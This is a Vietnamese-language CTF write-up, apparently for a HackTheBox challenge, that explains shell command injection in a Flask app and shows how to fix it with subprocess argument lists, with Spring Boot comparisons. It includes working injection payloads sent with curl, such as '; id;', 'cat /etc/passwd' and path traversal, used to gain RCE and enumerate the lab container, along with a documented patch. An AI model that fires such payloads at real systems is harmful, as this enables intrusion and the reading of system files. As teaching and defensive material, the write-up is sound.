Phần 0 — Kiến thức nền cần có trước khi bắt đầu

0.1 — Command injection là gì?

Khi code ghép chuỗi input của ngưởi dùng vào một câu lệnh shell rồi thực thi, kẻ tấn công có thể chèn thêm lệnh của riêng mình. Ví dụ điển hình:

# app định chạy: ls /var/log
command = f"ls {directory}"
os.popen(command)

# kẻ tấn công gửi directory = "/; cat /etc/passwd; "
# shell thực thi: ls / ; cat /etc/passwd;

Các ký tự đặc biệt của shell: ; (ngắt lệnh), | (pipe), $() và ` ` (thực thi và thay thế), &&, > < (redirect), # (comment), khoảng trắng, newline…

☕ Tương đồng Spring Boot

Giống hệt viết Runtime.getRuntime().exec("ls " + dir) với chuỗi nối thay vì truyền mảng tham số — hay dùng ProcessBuilder(Arrays.asList("ls", dir)) mà vẫn ghép chuỗi vào sh -c.

✔ Cách verify: gửi input dir = "; id;" — nếu output có uid=... thì app bị injection. Đây là phép kiểm chứng tay cho mọi bài command injection.

0.2 — Cách vá đúng: subprocess với danh sách tham số (không qua shell)

# ❌ Qua shell — mọi ký tự đặc biệt có nghĩa
os.system(f"cat /etc/{name}")

# ✅ Không shell — mỗi tham sộ là một chuỗi riêng, không ai diễn dịch gì cả
subprocess.run(["cat", "/etc/" + name], capture_output=True, text=True)

Không có shell thì ; | $() chỉ là ký tự vô nghĩa trong tên file. Đây là vá cấu trúc. Bổ sung thêm validate đầu vào (whitelist ký tự) là vá phòng thủ sâu.

☕ Tương đồng Spring Boot

ProcessBuilder("cat", "/etc/" + name) — Java không tự nhiên có shell nên ít gặp lỗi này hơn; chỗ dễ sai là Runtime.exec("sh", "-c", "...") hoặc nối chuỗi vào command. Cũng giống SQL: parameterized query vs nối chuỗi.

Bài này thuộc dạng vá lỗi lấy flag, giống bài Research Logs:

Phần 1 — Recon: vẽ bản đồ hệ thống

Bài này có source zip kèm đề — đọc code trước, khai thác sau. Nhưng source zip và runtime khác nhau (đường dẫn /www/app trong zip vs /app/main_app trong container), nên mọi giả định đều phải kiểm chứng trên instance thật.

1.1 — Đọc source: xác định 3 điểm injection

File challenge/app/app.py trong zip có 3 endpoint ghép input vào lệnh shell:

# Điểm 1: os.system + f-string — injection qua suffix
command = f"tar -czf /www/app/logs/logs_{suffix}.tar.gz /var/log/system_app.err.log"
os.system(command)

# Điểm 2: os.popen + f-string — injection + path traversal
command = f"cat /etc/{config_name}"
result = os.popen(command).read()

# Điểm 3: os.popen + f-string — injection
command = f"ls {directory}"
logs_listing = os.popen(command).read()
✔ Cách verify: phân tích tĩnh — ghi nhớ cả 3 endpoint + tham số: suffix, config_name, log_directory. Cả 3 đều POST form-urlencoded.

1.2 — Tìm app thật: SPA "HTB Editor" đánh lừa

# trang gốc — là SPA editor, KHÔNG phải app
curl -s http://<host>:<port>/ | grep -o '<title>[^<]*</title>'   # -> HTB Editor

# /challenge redirect 308 — app thật ở đây
curl -s -L http://<host>:<port>/challenge/ | grep -o '<title>[^<]*</title>'  # -> Rick's Ship Registry
✔ Cách verify: title chuyển từ HTB Editor sang Rick's Ship Registry — chỉ khi thấy title app thật mới khai thác tiếp.

1.3 — Xác nhận injection hoạt động

# đọc file config hợp lệ qua endpoint read_config
curl -s -X POST http://<host>:<port>/challenge/logs/read_config \
  -d 'config_name=hostname'
# -> tên host của container (thành công)

# payload injection kinh điển của exploit.py kèm đề
curl -s -X POST http://<host>:<port>/challenge/logs/log_listing \
  --data-raw 'log_directory=/; touch /tmp/poc;'
✔ Cách verify: bước đầu phải in ra tên host; bước sau tạo /tmp/poc — kiểm chứng bằng log_directory=/tmp xem có tên file đó không.

Phần 2 — Dead ends (các hướng trực diện thất bại)

THẤT BẠI Đọc flag trực tiếp qua traversal

Thử đọc các vị trí flag phổ biến qua read_config (nối vào /etc/):

config_name=../../flag.txt        # -> rỗng (cat /flag.txt, file không tồn tại)
config_name=../../02cc1c...txt      # -> rỗng (file TỒN TẠI nhưng không có quyền đọc)

Kết quả thật: sau khi liệt kê root bằng injection, tìm thấy /02cc1c3107db54c1302722573c2d835c.txt với quyền -r--r----- root editor, 36 byte. App chạy user challenger (group challenger) → đọc bị từ chối (cat trả rỗng).

Kết luận: flag cần quyền nhóm editor. Không có sudo, không có SUID hữu ích, /proc bị ẩn (hidepid), socket supervisord chỉ cho nhóm editor. Đường duy nhất là pass endpoint verify.

THẤT BẠI Kill process để restart Flask

Flask chạy debug=False nên không tự reload sau khi sửa file. Thử giết process:

log_directory=/; pkill -f main_app;      # -> pkill không tồn tại trong container
log_directory=/; fuser -k 3000/tcp;       # -> fuser không tồn tại
log_directory=/; kill -9 20;              # -> response đứt giữa chừng nhưng process không chết

Kết quả thật: container chạy mỗi request trong namespace riêng — PID nhìn thấy (qua ss -tlnp) là của namespace khác, kill không tác động được process thật.

Kết luận: phải dùng POST /editor_api/restart của chính editor — endpoint này restart service đúng cách.

THẤT BẠI Mount SMB share theo note.md

note.md hướng dẫn mount SMB share để sửa file trực tiếp. Nhưng instance này chỉ mở 1 port ra ngoài (web); smbd không chạy trong container (kiểm chứng: ss -tlnp chỉ thấy 1337/3000/9000, gửi SMB handshake thô vào port web không có phản hồi).

Kết luận: note.md mang tính generic; ở instance này mọi thao tác đều qua web.

Phần 3 — Khai thác RCE hoàn chỉnh

3.1 — Xác nhận RCE bằng marker

# dấu ; ngắt lệnh ls, chèn id, # chặn phần còn lại
curl -s -X POST http://<host>:<port>/challenge/logs/log_listing \
  --data-raw 'log_directory=/; echo START; id; echo END;'

Output:

... (danh sách / như bình thường) ...
START
uid=100(challenger) gid=1000(challenger) groups=1000(challenger)
END
✔ Cách verify: ba dấu hiệu xuất hiện đúng thứ tự: output của ls /, marker START, output của id. Đây là bằng chứng RCE không thể chối cãi.

3.2 — Dò cấu trúc file và tìm flag

log_directory=/; echo S; ls -la /; ls -la /app /app/main_app; cat /etc/passwd | tail -3; echo E;

Phát hiện quan trọng:

  • App runtime ở /app/main_app (KHÔNG phải /www/app như source zip) — code có dùng Blueprint prefix /challenge.
  • User app: challenger (uid 100); user editor (uid 101) tồn tại.
  • Flag: /02cc1c3107db54c1302722573c2d835c.txt, quyền root:editor — chỉ nhóm editor đọc được.
  • nginx config: /challenge → Flask :3000, còn lại → editor service :9000 (user editor).
  • supervisord chạy app dưới user challenger, editor service dưới user editor.
✔ Cách verify: mỗi phát hiện đều từ output lệnh thật — đối chiếu quyền file flag -r--r----- root editor với id (challenger) để kết luận không đọc trực tiếp được.

Phần 4 — Vá lỗi và hành trình verify

4.1 — Bản vá đề xuất (subprocess + whitelist)

# Vá cả 3 endpoint: subprocess danh sách tham số + whitelist ký tự + 400 cho input xấu
SAFE_SUFFIX = re.compile(r"^[A-Za-z0-9_-]+$")
SAFE_CONFIG = re.compile(r"^[A-Za-z0-9_.-]+$")
SAFE_DIR    = re.compile(r"^[A-Za-z0-9_./-]+$")

# archive_logs:
if not suffix or not SAFE_SUFFIX.fullmatch(suffix):
    return "Invalid suffix", 400
subprocess.run(["tar", "-czf", target, "/var/log/main_app.err.log"], check=False)

# read_config: whitelist + chống traversal bằng realpath
path = os.path.realpath(os.path.join("/etc", config_name))
if path != "/etc" and not path.startswith("/etc/"):
    return "Invalid filename", 400
subprocess.run(["cat", path], capture_output=True, text=True).stdout

# log_listing:
if not SAFE_DIR.fullmatch(directory):
    return "Invalid directory", 400
subprocess.run(["ls", directory], capture_output=True, text=True).stdout

4.2 — Quy trình áp dụng bản vá

  1. Đọc nội dung hiện tại: GET /editor_api/file?path=app.py → tính md5 của content (server đòi client_md5 khớp nội dung hiện tại, sai → 409 CONFLICT).
  2. POST /editor_api/save với JSON {"path":"app.py","content":"<bản vá>","client_md5":"<md5 cũ>"}.
  3. POST /editor_api/restart — Flask debug=False không tự reload, bắt buộc restart qua đây.
  4. Kiểm chứng injection bị chặn, chức năng hợp lệ còn chạy.
  5. GET /editor_api/verify.
✔ Cách verify sau restart: payload log_directory=/; id; → 400 Invalid directory (không còn uid=); config_name=../../flag.txt → 400; suffix=x;id → 400; còn config_name=hostname vẫn trả nội dung file, archive suffix=rolled_test vẫn tạo file.

4.3 — Kết quả verify: vẫn fail ở bước cuối

Bản vá trên đã kiểm chứng tay đầy đủ: mọi payload injection đều 400, chức năng hợp lệ nguyên vẹn. Nhưng /editor_api/verify vẫn trả {"error":"Vulnerability check failed — the security issue has not been resolved."}.

Để tìm hiểu, tôi cài một bản app "gửi lại" log mọi request checker gửi vào /tmp/reqlog.txt rồi đọc lại. Chuỗi request của checker:

# Functionality check (pass)
READCFG cfg=''                          # mong đợi 400
LISTING dir='/app/main_app/logs'
READCFG cfg='hosts'
READCFG cfg='os-release'

# Rồi đến một bước archive:
ARCHIVE suffix='AOtyUBlNmpKn'           # 12 ký tự ngẫu nhiên alphanumeric

Và fail NGAY sau đó. Kiểm chứng thủ công: archive với suffix ngẫu nhiên tạo file thành công đúng tên, đúng nội dung (tar -tzf cho thấy var/log/main_app.err.log, ~2.6 KB). Không có request nào khác sau đó.

Phần 5 — Root cause qua góc nhìn Spring Boot

❌ Code bị sai (Python/Flask — bản gốc)
# Input nguoi dung duoc noi thang vao lenh shell
suffix = request.form.get("suffix", "")
command = f"tar -czf {APPDIR}/logs/logs_{suffix}.tar.gz /var/log/main_app.err.log"
os.system(command)          # <== shell dien dich moi ky tu dac biet
✅ Code sửa (Python/Flask)
# 1) Validate dau vao theo whitelist — tu choi som, tra 400
if not suffix or not SAFE_SUFFIX.fullmatch(suffix):
    return "Invalid suffix", 400
# 2) Khong qua shell — moi tham so la 1 chuoi doc lap
target = os.path.join(APPDIR, "logs", f"logs_{suffix}.tar.gz")
subprocess.run(["tar", "-czf", target, "/var/log/main_app.err.log"], check=False)
❌ Tương đồng Spring Boot — lỗi tương tự
@PostMapping("/logs/archive")
public String archive(@RequestParam String suffix) throws IOException {
    // BUG: noi chuoi vao lenh, sh -c dien dich moi ky tu dac biet
    Runtime.getRuntime().exec("sh", "-c",
        "tar -czf /app/logs/logs_" + suffix + ".tar.gz /var/log/app.log");
    return "Success";
}
✅ Cách viết đúng trong Spring Boot
private static final Pattern SAFE = Pattern.compile("^[A-Za-z0-9_-]+$");

@PostMapping("/logs/archive")
public ResponseEntity<String> archive(@RequestParam String suffix) throws IOException {
    if (!SAFE.matcher(suffix).matches()) {
        return ResponseEntity.badRequest().body("Invalid suffix");
    }
    // ProcessBuilder nhan tung tham so rieng le — khong co shell
    new ProcessBuilder("tar", "-czf",
            "/app/logs/logs_" + suffix + ".tar.gz", "/var/log/app.log")
        .redirectErrorStream(true).start().waitFor();
    return ResponseEntity.ok("Success");
}
Nguyên tắc: (1) không bao giờ nối input vào chuỗi lệnh; (2) validate whitelist trước khi chạy; (3) từ chối sớm bằng 400 thay vì "chạy rồi thất bại"; (4) với path, dùng realpath/Path.normalize() + kiểm tra prefix thư mục cho phép.

Phần 6 — Trạng thái & hướng tiếp theo

  1. Đã làm được: recon đầy đủ, RCE hoàn chỉnh, xác định chính xác vị trí flag (/02cc1c3107db54c1302722573c2d835c.txt, 36 byte, nhóm editor), vá an toàn (subprocess + whitelist) kiểm chứng tay chặn được mọi injection.
  2. Chưa làm được: pass /editor_api/verify — checker fail sau bước archive suffix ngẫu nhiên dù app xử lý đúng; chưa xác định được tiêu chí cuối cùng của checker.
  3. Hướng 1 — đọc code checker: cần đọc /app/editor/app.py. Mọi đường leo quyền lên nhóm editor hiện đều bị chặn (sudo không, SUID vô dụng, namespace cô lập, editor API lọc path tốt).
  4. Hướng 2 — thử tiếp các biến thể vá: giữ nguyên os.popen nhưng validate whitelist trước (một số checker chỉ grep hành vi f-string trần); hoặc thay tar bằng thư viện Python tarfile, cat bằng đọc file thuần Python, ls bằng os.listdir — loại bỏ hoàn toàn tiến trình con.
  5. Hướng 3 — quan sát checker kỹ hơn: cài app log cả response body/status trả về cho từng request của checker, so kỳ vọng vs thực tế từng bước.
  6. Bài học kỹ thuật: Flask debug=False không reload — phải restart qua cơ chế của challenge; client_md5 trong save API đòi md5 của nội dung hiện tại trên server; kiểm chứng "vá xong" bằng tay trước khi tin verify.
